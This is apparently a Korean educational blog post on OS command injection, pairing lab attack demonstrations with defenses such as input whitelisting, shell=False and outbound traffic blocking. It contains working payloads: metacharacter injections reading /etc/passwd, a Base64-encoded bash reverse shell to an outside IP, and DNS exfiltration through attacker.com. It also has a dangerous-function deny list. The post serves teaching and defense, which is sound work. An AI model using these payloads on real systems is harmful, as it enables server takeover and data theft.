---
layout: post
title: "Command Injection"
date: 2025-09-03 17:00:00 +0900
categories: [web-hacking]
---

## 1. 개요

**Command Injection**은 웹 애플리케이션이 사용자 입력을 적절한 검증 없이 시스템 쉘(Shell)에 전달할 때 발생하는 취약점이다.
공격자는 이를 통해 웹 서버의 운영체제(OS) 명령어를 실행할 수 있으며, 시스템 권한을 탈취하거나 민감한 파일을 열람하는 등 심각한 피해를 입힐 수 있다.

### 발생 원인
개발자가 `system()`, `exec()`, `passthru()`와 같은 함수를 사용하여 외부 명령어(예: ping, nslookup)를 호출할 때, 사용자 입력값을 직접 연결하여 사용할 경우 발생한다.

---

## 2. 위험도

| 항목 | 값 |
|------|-----|
| **OWASP Top 10** | A05:2025 - Injection |
| **CWE** | CWE-78 (OS Command Injection) |
| **CVSS** | 9.8 (Critical) |

---

## 3. 공격 기법

### 메타 문자 활용

쉘에서 여러 명령을 연결하는 메타 문자를 악용한다.

| 문자 | 설명 | 예시 |
|------|------|------|
| `;` | 명령 구분 (앞 명령 성공 여부 무관) | `127.0.0.1; cat /etc/passwd` |
| `&&` | 앞 명령 성공 시 실행 | `127.0.0.1 && whoami` |
| `\|\|` | 앞 명령 실패 시 실행 | `invalid \|\| whoami` |
| `\|` | 파이프 (출력을 다음 입력으로) | `127.0.0.1 \| nc attacker 4444` |
| `$()` | 명령 치환 | `$(whoami)` |

> **공격 흐름**: 네트워크 진단 페이지에서 IP 입력란에 `127.0.0.1; cat /etc/passwd` 입력 → 서버가 `ping 127.0.0.1; cat /etc/passwd` 실행 → 민감 정보 노출.

**Command Injection 흐름:**
```mermaid
sequenceDiagram
    participant 공격자
    participant 웹서버
    participant OS

    공격자->>웹서버: 1. IP 입력: 127.0.0.1; cat /etc/passwd
    웹서버->>OS: 2. system("ping 127.0.0.1; cat /etc/passwd")
    Note right of OS: 두 명령이 순차 실행됨
    OS-->>웹서버: 3. ping 결과 + /etc/passwd 내용
    웹서버-->>공격자: 4. 민감 정보 노출
```

---

### Base64 인코딩 우회

필터링을 우회하기 위해 명령어를 Base64로 인코딩한다.

```bash
# 원본: bash -i >& /dev/tcp/192.9.200.12/4444 0>&1
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx" | base64 -d | bash
```

**주입 예시:**
```
127.0.0.1; echo YmFzaCAtaSA+Ji... | base64 -d | bash
```

---

### Blind Injection

결과가 화면에 출력되지 않을 때 사용한다.

**Time-based:**
```bash
127.0.0.1; sleep 5
# 응답이 5초 지연되면 명령 실행 성공
```

**Out-of-Band:**
```bash
127.0.0.1; ping -c 1 $(whoami).attacker.com
# DNS 로그에서 사용자명 확인
```

---

## 4. 보안 고려사항

Command Injection은 한 번 성공하면 **시스템 전체를 장악**할 수 있는 치명적인 취약점이다. 시스템 명령어 호출을 최소화하고, 불가피한 경우 철저한 검증이 필요하다.

### 4.1. 공격 시연 (Lab 환경)

#### 공격 1: 기본 Command Injection → 민감 정보 탈취

**[취약한 환경]**
*   네트워크 진단 페이지에서 IP를 입력받아 `ping` 실행
*   사용자 입력값 검증 없음

**[공격 과정]**
```http
# 1. 정상 요청
GET /ping?ip=127.0.0.1 HTTP/1.1
# 서버: system("ping -c 4 127.0.0.1")
# 응답: PING 127.0.0.1 ...

# 2. 명령어 삽입 (공격)
GET /ping?ip=127.0.0.1;cat%20/etc/passwd HTTP/1.1
# 서버: system("ping -c 4 127.0.0.1; cat /etc/passwd")
# 응답: 
# PING 127.0.0.1 ...
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:...
```

**[공격 결과]**: 명령어 삽입 → 시스템 정보 노출 🔓

---

#### 공격 2: Reverse Shell 연결

**[취약한 환경]**
*   Command Injection 취약점 존재
*   서버에서 외부로 나가는 트래픽 미차단

**[공격 과정]**
```bash
# 1. 공격자 PC에서 리스너 실행
nc -lvnp 4444

# 2. 웹 요청으로 Reverse Shell 삽입
# Base64 인코딩으로 특수문자 우회
GET /ping?ip=127.0.0.1;echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ%3D%3D|base64%20-d|bash HTTP/1.1

# 3. 공격자 터미널에서 쉘 획득
# Connection from 192.168.1.50
# www-data@victim:~$ whoami
# www-data
```

**[공격 결과]**: Reverse Shell → 서버 원격 제어 🔓

---

#### 공격 3: Blind Injection (Time-based)

**[취약한 환경]**
*   명령 실행 결과가 화면에 출력되지 않음
*   에러 메시지도 미노출

**[공격 과정]**
```bash
# 1. 시간 지연으로 취약 여부 확인
GET /ping?ip=127.0.0.1;sleep%205 HTTP/1.1
# 응답이 5초 후에 오면 명령 실행 성공!

# 2. 한 글자씩 데이터 추출 (Time-based Exfiltration)
# 첫 번째 문자가 'r'인지 확인
GET /ping?ip=127.0.0.1;if[$(whoami|cut -c1)='r'];then%20sleep%205;fi HTTP/1.1
# 5초 지연 → 첫 글자는 'r' = root

# 3. 또는 DNS를 통한 데이터 유출
GET /ping?ip=127.0.0.1;ping%20-c1%20$(whoami).attacker.com HTTP/1.1
# 공격자 DNS 로그: www-data.attacker.com 쿼리 확인
```

**[공격 결과]**: Blind 환경에서도 데이터 추출 🔓

---

### 4.2. 방어 대책

| 공격 | 방어 |
|:---|:---|
| 기본 Injection | 방어 1, 2, 3 |
| Reverse Shell | 방어 4 |
| Blind Injection | 방어 1, 4 |

---

#### 방어 1: 입력값 화이트리스트 검증

허용된 패턴만 통과시킨다.

```php
// IP 주소: 숫자와 점(.)만 허용
if (!preg_match('/^[0-9.]+$/', $ip)) {
    die("잘못된 IP 형식입니다.");
}

// 도메인: 알파벳, 숫자, 하이픈, 점만 허용
if (!preg_match('/^[a-zA-Z0-9.-]+$/', $domain)) {
    die("잘못된 도메인 형식입니다.");
}
```

---

#### 방어 2: 안전한 API 사용 (shell=False)

쉘을 거치지 않고 명령어를 직접 실행한다.

```python
import subprocess

# ❌ 위험: shell=True (쉘 메타문자 해석됨)
subprocess.run(f"ping -c 4 {user_input}", shell=True)

# ✅ 안전: shell=False (인자를 배열로 전달)
subprocess.run(["ping", "-c", "4", user_input], shell=False)
# user_input에 "; cat /etc/passwd"가 있어도 ping의 인자로만 처리됨
```

---

#### 방어 3: 인자 이스케이프

불가피하게 쉘을 사용해야 할 경우 인자를 이스케이프한다.

```php
// escapeshellarg(): 인자 전체를 따옴표로 감싸고 특수문자 이스케이프
$safe_ip = escapeshellarg($ip);
system("ping -c 4 " . $safe_ip);

// escapeshellcmd(): 명령어 전체에서 위험한 문자 이스케이프
$safe_cmd = escapeshellcmd("ping -c 4 " . $ip);
system($safe_cmd);
```

---

#### 방어 4: 시스템 레벨 방어

웹 서버 계정의 권한을 최소화하고, 네트워크를 제한한다.

```bash
# 1. 웹 서버를 최소 권한 계정으로 실행
# Apache: User www-data, Group www-data

# 2. 위험한 함수 비활성화 (php.ini)
disable_functions = system, exec, shell_exec, passthru, popen, proc_open

# 3. 아웃바운드 트래픽 차단 (Reverse Shell 방지)
iptables -A OUTPUT -m owner --uid-owner www-data -j DROP
# 또는 특정 포트만 허용
iptables -A OUTPUT -m owner --uid-owner www-data -p tcp --dport 80 -j ACCEPT
```

---

## 5. 실습 환경

### DVWA
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```
*   Command Injection 메뉴에서 Low/Medium/High 난이도별 실습

### Commix (자동화 도구)
```bash
# Command Injection 자동 탐지 및 익스플로잇
commix --url="http://target/ping?ip=127.0.0.1"
```

---

## OWASP Top 10 매핑

| 관련 항목 | 설명 |
|----------|------|
| **A05: Injection** | 시스템 쉘에 악성 명령어가 주입되어 실행되는 대표적인 인젝션 공격이다. |

<hr class="short-rule">